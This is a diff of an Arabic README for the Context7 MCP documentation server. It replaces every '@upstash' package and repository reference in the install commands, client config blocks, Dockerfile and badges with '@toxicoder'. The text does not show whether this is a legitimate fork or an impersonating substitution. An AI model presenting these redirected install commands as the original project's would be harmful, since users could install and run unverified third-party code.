@@ -1,6 +1,6 @@
 # Context7 MCP - توثيق أكواد محدث لأي أمر برمجي
 
-[![Website](https://img.shields.io/badge/Website-context7.com-blue)](https://context7.com) [![smithery badge](https://smithery.ai/badge/@upstash/context7-mcp)](https://smithery.ai/server/@upstash/context7-mcp) [<img alt="Install in VS Code (npx)" src="https://img.shields.io/badge/VS_Code-VS_Code?style=flat-square&label=Install%20Context7%20MCP&color=0098FF">](https://insiders.vscode.dev/redirect?url=vscode%3Amcp%2Finstall%3F%7B%22name%22%3A%22context7%22%2C%22command%22%3A%22npx%22%2C%22args%22%3A%5B%22-y%22%2C%22%40upstash%2Fcontext7-mcp%40latest%22%5D%7D)
+[![Website](https://img.shields.io/badge/Website-context7.com-blue)](https://context7.com) [![smithery badge](https://smithery.ai/badge/@toxicoder/context7-mcp)](https://smithery.ai/server/@toxicoder/context7-mcp) [<img alt="Install in VS Code (npx)" src="https://img.shields.io/badge/VS_Code-VS_Code?style=flat-square&label=Install%20Context7%20MCP&color=0098FF">](https://insiders.vscode.dev/redirect?url=vscode%3Amcp%2Finstall%3F%7B%22name%22%3A%22context7%22%2C%22command%22%3A%22npx%22%2C%22args%22%3A%5B%22-y%22%2C%22%40toxicoder%2Fcontext7-mcp%40latest%22%5D%7D)
 
 ## ❌ بدون Context7
 
@@ -44,7 +44,7 @@
 لتثبيت Context7 MCP Server تلقائيًا لـ Claude Desktop:
 
 ```bash
-npx -y @smithery/cli install @upstash/context7-mcp --client claude
+npx -y @smithery/cli install @toxicoder/context7-mcp --client claude
 ```
 
 ### التثبيت في Cursor
@@ -58,7 +58,7 @@ npx -y @smithery/cli install @upstash/context7-mcp --client claude
   "mcpServers": {
     "context7": {
       "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp@latest"]
+      "args": ["-y", "@toxicoder/context7-mcp@latest"]
     }
   }
 }
@@ -71,7 +71,7 @@ npx -y @smithery/cli install @upstash/context7-mcp --client claude
   "mcpServers": {
     "context7": {
       "command": "bunx",
-      "args": ["-y", "@upstash/context7-mcp@latest"]
+      "args": ["-y", "@toxicoder/context7-mcp@latest"]
     }
   }
 }
@@ -84,7 +84,7 @@ npx -y @smithery/cli install @upstash/context7-mcp --client claude
   "mcpServers": {
     "context7": {
       "command": "deno",
-      "args": ["run", "--allow-env", "--allow-net", "npm:@upstash/context7-mcp"]
+      "args": ["run", "--allow-env", "--allow-net", "npm:@toxicoder/context7-mcp"]
     }
   }
 }
@@ -97,7 +97,7 @@ npx -y @smithery/cli install @upstash/context7-mcp --client claude
   "mcpServers": {
     "context7": {
       "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp@latest"]
+      "args": ["-y", "@toxicoder/context7-mcp@latest"]
     }
   }
 }
@@ -111,7 +111,7 @@ npx -y @smithery/cli install @upstash/context7-mcp --client claude
     "Context7": {
       "type": "stdio",
       "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp@latest"]
+      "args": ["-y", "@toxicoder/context7-mcp@latest"]
     }
   }
 }
@@ -125,7 +125,7 @@ npx -y @smithery/cli install @upstash/context7-mcp --client claude
     "Context7": {
       "source": "custom",
       "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp", "--api-key", "YOUR_API_KEY"]
+      "args": ["-y", "@toxicoder/context7-mcp", "--api-key", "YOUR_API_KEY"]
     }
   }
 }
@@ -134,7 +134,7 @@ npx -y @smithery/cli install @upstash/context7-mcp --client claude
 ### التثبيت في Claude Code
 
 ```sh
-claude mcp add context7 -- npx -y @upstash/context7-mcp@latest
+claude mcp add context7 -- npx -y @toxicoder/context7-mcp@latest
 ```
 
 ### التثبيت في Claude Desktop
@@ -144,7 +144,7 @@ claude mcp add context7 -- npx -y @upstash/context7-mcp@latest
   "mcpServers": {
     "Context7": {
       "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp@latest"]
+      "args": ["-y", "@toxicoder/context7-mcp@latest"]
     }
   }
 }
@@ -157,7 +157,7 @@ claude mcp add context7 -- npx -y @upstash/context7-mcp@latest
   "mcpServers": {
     "context7": {
       "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp@latest"]
+      "args": ["-y", "@toxicoder/context7-mcp@latest"]
     }
   }
 }
@@ -188,7 +188,7 @@ claude mcp add context7 -- npx -y @upstash/context7-mcp@latest
 ```Dockerfile
 FROM node:18-alpine
 WORKDIR /app
-RUN npm install -g @upstash/context7-mcp@latest
+RUN npm install -g @toxicoder/context7-mcp@latest
 CMD ["context7-mcp"]
 ```
 
@@ -217,9 +217,9 @@ docker build -t context7-mcp .
 ```json
 {
   "mcpServers": {
-    "github.com/upstash/context7-mcp": {
+    "github.com/toxicoder/context7-mcp": {
       "command": "cmd",
-      "args": ["/c", "npx", "-y", "@upstash/context7-mcp@latest"],
+      "args": ["/c", "npx", "-y", "@toxicoder/context7-mcp@latest"],
       "disabled": false,
       "autoApprove": []
     }
@@ -258,7 +258,7 @@ bun run build
 **الاختبار باستخدام MCP Inspector:**
 
 ```bash
-npx -y @modelcontextprotocol/inspector npx @upstash/context7-mcp@latest
+npx -y @modelcontextprotocol/inspector npx @toxicoder/context7-mcp@latest
 ```
 
 ## استكشاف الأخطاء
@@ -272,7 +272,7 @@ npx -y @modelcontextprotocol/inspector npx @upstash/context7-mcp@latest
   "mcpServers": {
     "context7": {
       "command": "bunx",
-      "args": ["-y", "@upstash/context7-mcp@latest"]
+      "args": ["-y", "@toxicoder/context7-mcp@latest"]
     }
   }
 }
@@ -285,7 +285,7 @@ npx -y @modelcontextprotocol/inspector npx @upstash/context7-mcp@latest
 ```json
 {
   "command": "npx",
-  "args": ["-y", "--node-options=--experimental-vm-modules", "@upstash/context7-mcp@1.0.6"]
+  "args": ["-y", "--node-options=--experimental-vm-modules", "@toxicoder/context7-mcp@1.0.6"]
 }
 ```
 
@@ -313,7 +313,7 @@ npx -y @modelcontextprotocol/inspector npx @upstash/context7-mcp@latest
 
 ## سجل النجوم
 
-[![Star History Chart](https://api.star-history.com/svg?repos=upstash/context7&type=Date)](https://www.star-history.com/#upstash/context7&Date)
+[![Star History Chart](https://api.star-history.com/svg?repos=toxicoder/context7&type=Date)](https://www.star-history.com/#toxicoder/context7&Date)
 
 ## الترخيص
 
